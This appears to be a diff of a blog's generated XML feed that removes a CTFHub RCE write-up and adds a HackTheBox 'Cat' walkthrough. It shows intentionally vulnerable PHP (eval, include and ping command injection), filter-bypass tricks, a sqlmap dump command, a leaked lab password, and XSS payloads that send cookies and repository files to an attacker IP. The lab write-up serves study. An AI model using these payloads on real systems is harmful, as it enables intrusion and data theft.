+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:\Users\CNsirius\AppData\Roaming\Typora\typora-user-images\image-20220219105932534.png" alt="image-20220219105932534"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:\Users\CNsirius\AppData\Roaming\Typora\typora-user-images\image-20220219110644693.png" alt="image-20220219110644693"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:\Users\CNsirius\AppData\Roaming\Typora\typora-user-images\image-20220219110736333.png" alt="image-20220219110736333"></p>
+]]></content>
+      <categories>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>ctfhub</tag>
+        <tag>rce</tag>
       </tags>
   </entry>
   <entry>
@@ -561,73 +631,80 @@
       </tags>
   </entry>
   <entry>
-    <title>ctfhub-rce</title>
-    <url>/2022/04/ctfhub-rce/</url>
-    <content><![CDATA[<p>rce：远程代码执行漏洞<br>分为远程命令执行 ping 和远程代码执行 evel。<br><strong>其实这就是一个接口，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统，这就是 RCE 漏洞</strong>。相当于直接操控服务器电脑的 cmd 命令行！高危漏洞！</p>
-<h2 id="eval-执行"><a href="#eval-执行" class="headerlink" title="eval 执行"></a>eval 执行</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+    <title>htb-Cat</title>
+    <url>/2025/02/htb-Cat/</url>
+    <content><![CDATA[<h2 id="Cat"><a href="#Cat" class="headerlink" title="Cat"></a>Cat</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p><code>nmap -A -sS -Pn 10.10.11.53</code></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image-20250219205858249.png" alt="image-20250219205858249"></p>
+<p>发现 git 泄露</p>
+<p><code>python GitHack.py http://cat.htb/.git/</code></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image-20250219210023476.png" alt="image-20250219210023476"></p>
+<p>首先看图片上传，白名单没法绕过</p>
+<p>然后发现 xss 和 sql</p>
+<h3 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h3><p>结合两个可能被后台机器人看到的页面<code>view_cat.php</code> <code>admin.php</code></p>
+<p>会输出如下信息</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image-20250219204330226.png" alt="view_cat.php"></p>
+<p>再到两个可控输入<code>contest.php</code> <code>join.php</code></p>
+<p>可以看到 contest 中为与猫相关的信息，且有过滤</p>
+<p>而 join 中的 name 会被 contest 带入猫库，并最后被 view_cat 输出为 Owner</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image-20250219204658476.png" alt="contest"></p>
+<p>尝试将 name 写为</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">document</span>.<span class="property">location</span> = <span class="string">&quot;http://10.10.xx.xx:8080/?c=&quot;</span> + <span class="variable language_">document</span>.<span class="property">cookie</span>;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p>传参给 cmd 来 eval</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/?cmd=<span class="title function_ invoke__">system</span>(<span class="string">&quot;ls /&quot;</span>);<span class="comment">//此处因为根目录无flag 所以看上一级目录</span></span><br></pre></td></tr></table></figure>
-
-<p>找到后 再 cat &#x2F;flag_****</p>
-<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>这里使用 strpos 函数</p>
+<p>将 cookie 带出</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image-20250219204042491.png" alt="cookie"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image-20250219203550378.png" alt="view_cat"></p>
 <blockquote>
-<p>strpos:查找字符串首次出现的位置</p>
-<p>int strpos ( string $haystack , mixed $needle [, int $offset &#x3D; 0 ] )</p>
+<p>一开始以为是 cat 的信息，后来发现 cat 的信息都被<code>contains_forbidden_content</code>过滤了，然后才发现 owner_username</p>
 </blockquote>
-<p>题目使用</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">strpos</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>],<span class="string">&quot;flag&quot;</span>))&#123;<span class="comment">//无flag字符即可运行</span></span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="sql-inject"><a href="#sql-inject" class="headerlink" title="sql inject"></a>sql inject</h3><p>所有的 sql 语句都 prepare 过了，只有<code>accept_cat.php(10)</code>存在一条 insert 没有预编译</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap --batch --risk 3 --level 5 --threads 10 -r &quot;~/tmp.txt&quot; --dbms=sqlite -T users --dump</span><br></pre></td></tr></table></figure>
 
-<p>来包含文件，而下方给出的 shell.txt 含有 eval 漏洞</p>
-<p>于是包含它（shell.txt 没有“flag”字符 所以这里 strpos 没影响）</p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:\Users\CNsirius\AppData\Roaming\Typora\typora-user-images\image-20220218182857507.png" alt="image-20220218182857507"></p>
-<p>通过 get(包含文件) post(传参)并用来得到 flag</p>
-<h2 id="php-info"><a href="#php-info" class="headerlink" title="php info"></a>php info</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">	if ( substr($_GET[&quot;file&quot;], 0, 6) === &quot;php://&quot; ) &#123;</span><br><span class="line">        include($_GET[&quot;file&quot;]);</span><br><span class="line">         &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        echo &quot;Hacker!!!&quot;;</span><br><span class="line">    	&#125;&#125;</span><br><span class="line">else &#123;</span><br><span class="line">    highlight_file(__FILE__);&#125;?&gt;</span><br><span class="line">&lt;hr&gt;i don&#x27;t have shell, how to get flag? &lt;br&gt;&lt;a href=&quot;phpinfo.php&quot;&gt;phpinfo&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image-20250220133111652.png" alt="csv"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image-20250220133006529.png" alt="hash"></p>
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>上 linpeas</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image-20250220145109216.png" alt="linpeas-logs"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image-20250220144522633.png" alt="linpeas-lastest"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image-20250220144412979.png" alt="linpeas-mails"></p>
+<p>发现大量 log 以及 mail</p>
+<p>结合之前的包，发现密码在 get 中明文传递</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image-20250220152636390.png" alt="log-passwd"></p>
+<p>查看 apache log 中<code>loginPassword</code>字段找到 axel 密码</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image-20250220162530669.png" alt="image-20250220162530669"></p>
+<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">axel: aNdZwgC4tI9gnVXv_e3Q;</span><br></pre></td></tr></table></figure>
 
-<p>点击 phpinfo 链接 可查看 php 环境</p>
-<h3 id="php-input"><a href="#php-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*php:// — 访问各个输入/输出流（I/O streams）</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符，   内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">php://input是个可以访问请求的原始数据的只读流。</span></span><br></pre></td></tr></table></figure>
+<p>登陆获取 user.txt</p>
+<p>查看 axel 的 mail</p>
+<p>发现 rosa 发过来的</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image-20250220151410053.png" alt="mail"></p>
+<p>开隧道代理后进入该网址</p>
+<p>登录 rosa 以及 axel 的账号发现只有 axel 能登</p>
+<p>还没有该仓库的权限</p>
+<p>发现 1.22.0 版本 gitea 存在 xss 漏洞</p>
+<p>添加仓库 介绍写入 xss 初始化</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span></span></span><br><span class="line"><span class="tag">  <span class="attr">href</span>=<span class="string">&#x27;javascript:fetch(&quot;http://localhost:3000/administrator/Employee-management/&quot;).then(response=&gt;response.text()).then(data=&gt;fetch(&quot;http://10.10.16.22:8080/?d=&quot;+encodeURIComponent(btoa(unescape(encodeURIComponent(data))))));&#x27;</span></span></span><br><span class="line"><span class="tag">  &gt;</span>Click me&lt;/a</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
 
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:\Users\CNsirius\AppData\Roaming\Typora\typora-user-images\image-20220218162728184.png" alt="image-20220218162728184"></p>
-<h2 id="读取源代码"><a href="#读取源代码" class="headerlink" title="读取源代码"></a>读取源代码</h2><p>看环境 无法使用 php:&#x2F;&#x2F;input</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(E_ALL);</span><br><span class="line">if (isset($_GET[&#x27;file&#x27;])) &#123;</span><br><span class="line">    if ( substr($_GET[&quot;file&quot;], 0, 6) === &quot;php://&quot; ) &#123;</span><br><span class="line">        include($_GET[&quot;file&quot;]);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;Hacker!!!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>然后给他发邮件</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;Check my repo http://localhost:3000/axel/test&quot;</span> | sendmail jobert@cat.htb</span><br></pre></td></tr></table></figure>
 
-<p>但还必须是 php:&#x2F;&#x2F;开头</p>
-<h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a><a href="https://www.php.net/manual/zh/wrappers.php.php">php:&#x2F;&#x2F;filter</a></h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:\Users\CNsirius\AppData\Roaming\Typora\typora-user-images\image-20220219174206504.png" alt="image-20220219174206504"></p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:\Users\CNsirius\AppData\Roaming\Typora\typora-user-images\image-20220219112308277.png" alt="image-20220219112308277"></p>
-<h2 id="远程包含"><a href="#远程包含" class="headerlink" title="远程包含"></a>远程包含</h2><p>同 phpinfo 做法相同</p>
-<h2 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h2><p>输入命令</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">127.0.0.1;ls</span><br></pre></td></tr></table></figure>
+<p>监听时返回过长 开 wirshark 抓本地连接</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image-20250220161633473.png" alt="image-20250220161633473"></p>
+<p>解码得到一些文件</p>
+<p>搜索<code>title=</code>即可看到仓库里有哪些文件</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image-20250220161715394.png" alt="image-20250220161715394"></p>
+<p>然后挨个找 发现 index.php 里有密码</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span></span></span><br><span class="line"><span class="tag">  <span class="attr">href</span>=<span class="string">&#x27;javascript:fetch(&quot;http://localhost:3000/administrator/Employee-management/raw/branch/main/index.php&quot;).then(response=&gt;response.text()).then(data=&gt;fetch(&quot;http://10.10.16.22:8080/?d=&quot;+encodeURIComponent(btoa(unescape(encodeURIComponent(data))))));&#x27;</span></span></span><br><span class="line"><span class="tag">  &gt;</span>Click me&lt;/a</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
 
-<p>然后 cat 时出现了问题</p>
-<p>输出被限制了</p>
-<p>于是用管道符号来限制输出 base64</p>
-<p>得到后再解码</p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:\Users\CNsirius\AppData\Roaming\Typora\typora-user-images\image-20220218170811553.png" alt="image-20220218170811553"></p>
-<h2 id="过滤-cat"><a href="#过滤-cat" class="headerlink" title="过滤 cat"></a>过滤 cat</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$res = FALSE;</span><br><span class="line">if (isset($_GET[&#x27;ip&#x27;]) &amp;&amp; $_GET[&#x27;ip&#x27;]) &#123;</span><br><span class="line">    $ip = $_GET[&#x27;ip&#x27;];</span><br><span class="line">    $m = [];</span><br><span class="line">    if (!preg_match_all(&quot;/cat/&quot;, $ip, $m)) &#123;//过滤了cat</span><br><span class="line">        $cmd = &quot;ping -c 4 &#123;$ip&#125;&quot;;</span><br><span class="line">        exec($cmd, $res);</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        $res = $m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;pre&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">    if ($res) &#123;</span><br><span class="line">        print_r($res);</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/pre&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">	show_source(__FILE__);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-
-<h2 id="more"><a href="#more" class="headerlink" title="more"></a>more</h2><p>Linux more 命令类似 cat ，不过会以一页一页的形式显示，更方便使用者逐页阅读，而最基本的指令就是按空白键（space）就往下一页显示，按 b 键就会往回（back）一页显示，而且还有搜寻字串的功能（与 vi 相似），使用中的说明文件，请按 h 。</p>
-<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line">more <span class="section">[-dlfpcsu]</span> <span class="section">[-num]</span> <span class="section">[+/pattern]</span> <span class="section">[+linenum]</span> <span class="section">[fileNames..]</span></span><br></pre></td></tr></table></figure>
-
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:\Users\CNsirius\AppData\Roaming\Typora\typora-user-images\image-20220218171602745.png" alt="image-20220218171602745"></p>
-<h2 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h2><p>在 linux 里空格可用&lt; 或 ${IFS}代替</p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:\Users\CNsirius\AppData\Roaming\Typora\typora-user-images\image-20220218171910282.png" alt="image-20220218171910282"></p>
-<h2 id="过滤运算符"><a href="#过滤运算符" class="headerlink" title="过滤运算符"></a>过滤运算符</h2><p>cat [file]|base64 还可以用 base64 [file]</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$res = FALSE;</span><br><span class="line">if (isset($_GET[&#x27;ip&#x27;]) &amp;&amp; $_GET[&#x27;ip&#x27;]) &#123;</span><br><span class="line">    $ip = $_GET[&#x27;ip&#x27;];</span><br><span class="line">    $m = [];</span><br><span class="line">    if (!preg_match_all(&quot;/(\||\&amp;)/&quot;, $ip, $m)) &#123;</span><br><span class="line">        $cmd = &quot;ping -c 4 &#123;$ip&#125;&quot;;</span><br><span class="line">        exec($cmd, $res);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $res = $m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:\Users\CNsirius\AppData\Roaming\Typora\typora-user-images\image-20220219104650896.png" alt="image-20220219104650896"></p>
-<h2 id="综合练习"><a href="#综合练习" class="headerlink" title="综合练习"></a>综合练习</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">!<span class="title function_ invoke__">preg_match_all</span>(<span class="string">&quot;/(\||&amp;|;| |\/|cat|flag|ctfhub)/&quot;</span>, <span class="variable">$ip</span></span><br></pre></td></tr></table></figure>
-
-<p>;可以用%0a(url 编码) cat 用 base64 flag 用正则 f*** *lag 等 空格用 ${IFS}</p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:\Users\CNsirius\AppData\Roaming\Typora\typora-user-images\image-20220219105932534.png" alt="image-20220219105932534"></p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:\Users\CNsirius\AppData\Roaming\Typora\typora-user-images\image-20220219110644693.png" alt="image-20220219110644693"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:\Users\CNsirius\AppData\Roaming\Typora\typora-user-images\image-20220219110736333.png" alt="image-20220219110736333"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image-20250220155420455.png" alt="image-20250220155420455"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image-20250220155400083.png" alt="image-20250220155400083"></p>
+<p>su root 获取 root.txt</p>
 ]]></content>
       <categories>
-        <category>web</category>
+        <category>htb</category>
       </categories>
       <tags>
         <tag>web</tag>
-        <tag>ctfhub</tag>
-        <tag>rce</tag>
+        <tag>htb-Cat</tag>
+        <tag>HackTheBox</tag>
       </tags>
   </entry>
   <entry>
@@ -757,85 +834,8 @@
       </categories>
       <tags>
         <tag>web</tag>
+        <tag>HackTheBox</tag>
         <tag>htb-Shoppy</tag>
-        <tag>HackTheBox</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>htb-Cat</title>
-    <url>/2025/02/htb-Cat/</url>
-    <content><![CDATA[<h2 id="Cat"><a href="#Cat" class="headerlink" title="Cat"></a>Cat</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p><code>nmap -A -sS -Pn 10.10.11.53</code></p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image-20250219205858249.png" alt="image-20250219205858249"></p>
-<p>发现 git 泄露</p>
-<p><code>python GitHack.py http://cat.htb/.git/</code></p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image-20250219210023476.png" alt="image-20250219210023476"></p>
-<p>首先看图片上传，白名单没法绕过</p>
-<p>然后发现 xss 和 sql</p>
-<h3 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h3><p>结合两个可能被后台机器人看到的页面<code>view_cat.php</code> <code>admin.php</code></p>
-<p>会输出如下信息</p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image-20250219204330226.png" alt="view_cat.php"></p>
-<p>再到两个可控输入<code>contest.php</code> <code>join.php</code></p>
-<p>可以看到 contest 中为与猫相关的信息，且有过滤</p>
-<p>而 join 中的 name 会被 contest 带入猫库，并最后被 view_cat 输出为 Owner</p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image-20250219204658476.png" alt="contest"></p>
-<p>尝试将 name 写为</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">document</span>.<span class="property">location</span> = <span class="string">&quot;http://10.10.xx.xx:8080/?c=&quot;</span> + <span class="variable language_">document</span>.<span class="property">cookie</span>;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>将 cookie 带出</p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image-20250219204042491.png" alt="cookie"></p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image-20250219203550378.png" alt="view_cat"></p>
-<blockquote>
-<p>一开始以为是 cat 的信息，后来发现 cat 的信息都被<code>contains_forbidden_content</code>过滤了，然后才发现 owner_username</p>
-</blockquote>
-<h3 id="sql-inject"><a href="#sql-inject" class="headerlink" title="sql inject"></a>sql inject</h3><p>所有的 sql 语句都 prepare 过了，只有<code>accept_cat.php(10)</code>存在一条 insert 没有预编译</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap --batch --risk 3 --level 5 --threads 10 -r &quot;~/tmp.txt&quot; --dbms=sqlite -T users --dump</span><br></pre></td></tr></table></figure>
-
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image-20250220133111652.png" alt="csv"></p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image-20250220133006529.png" alt="hash"></p>
-<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>上 linpeas</p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image-20250220145109216.png" alt="linpeas-logs"></p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image-20250220144522633.png" alt="linpeas-lastest"></p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image-20250220144412979.png" alt="linpeas-mails"></p>
-<p>发现大量 log 以及 mail</p>
-<p>结合之前的包，发现密码在 get 中明文传递</p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image-20250220152636390.png" alt="log-passwd"></p>
-<p>查看 apache log 中<code>loginPassword</code>字段找到 axel 密码</p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image-20250220162530669.png" alt="image-20250220162530669"></p>
-<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">axel: aNdZwgC4tI9gnVXv_e3Q;</span><br></pre></td></tr></table></figure>
-
-<p>登陆获取 user.txt</p>
-<p>查看 axel 的 mail</p>
-<p>发现 rosa 发过来的</p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image-20250220151410053.png" alt="mail"></p>
-<p>开隧道代理后进入该网址</p>
-<p>登录 rosa 以及 axel 的账号发现只有 axel 能登</p>
-<p>还没有该仓库的权限</p>
-<p>发现 1.22.0 版本 gitea 存在 xss 漏洞</p>
-<p>添加仓库 介绍写入 xss 初始化</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span></span></span><br><span class="line"><span class="tag">  <span class="attr">href</span>=<span class="string">&#x27;javascript:fetch(&quot;http://localhost:3000/administrator/Employee-management/&quot;).then(response=&gt;response.text()).then(data=&gt;fetch(&quot;http://10.10.16.22:8080/?d=&quot;+encodeURIComponent(btoa(unescape(encodeURIComponent(data))))));&#x27;</span></span></span><br><span class="line"><span class="tag">  &gt;</span>Click me&lt;/a</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
-
-<p>然后给他发邮件</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;Check my repo http://localhost:3000/axel/test&quot;</span> | sendmail jobert@cat.htb</span><br></pre></td></tr></table></figure>
-
-<p>监听时返回过长 开 wirshark 抓本地连接</p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image-20250220161633473.png" alt="image-20250220161633473"></p>
-<p>解码得到一些文件</p>
-<p>搜索<code>title=</code>即可看到仓库里有哪些文件</p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image-20250220161715394.png" alt="image-20250220161715394"></p>
-<p>然后挨个找 发现 index.php 里有密码</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span></span></span><br><span class="line"><span class="tag">  <span class="attr">href</span>=<span class="string">&#x27;javascript:fetch(&quot;http://localhost:3000/administrator/Employee-management/raw/branch/main/index.php&quot;).then(response=&gt;response.text()).then(data=&gt;fetch(&quot;http://10.10.16.22:8080/?d=&quot;+encodeURIComponent(btoa(unescape(encodeURIComponent(data))))));&#x27;</span></span></span><br><span class="line"><span class="tag">  &gt;</span>Click me&lt;/a</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
-
